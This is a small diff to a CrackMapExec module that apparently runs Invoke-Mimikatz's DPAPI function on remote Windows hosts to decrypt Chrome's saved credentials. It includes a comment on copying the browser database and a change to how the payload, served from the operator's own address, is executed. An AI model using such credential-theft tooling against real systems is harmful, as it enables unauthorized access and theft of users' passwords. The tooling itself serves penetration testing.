@@ -33,7 +33,7 @@ class CMEModule:
             So Mimikatz's DPAPI module requires the path to Chrome's database in double quotes otherwise it can't interpret paths with spaces.
             Problem is Invoke-Mimikatz interpretes double qoutes as seperators for the arguments to pass to the injected mimikatz binary.
 
-            As far as I can figure out there is no way around this, hence we have to first copy Chrome's database to a path without any spaces and then decrypt 
+            As far as I can figure out there is no way around this, hence we have to first copy Chrome's database to a path without any spaces and then decrypt
             the entries with Mimikatz, not ideal but it works.
         '''
 
@@ -67,8 +67,7 @@ class CMEModule:
                                           port=context.server_port,
                                           addr=context.localip)
 
-        payload = create_ps_command(payload)
-        connection.execute(payload)
+        connection.ps_execute(payload)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
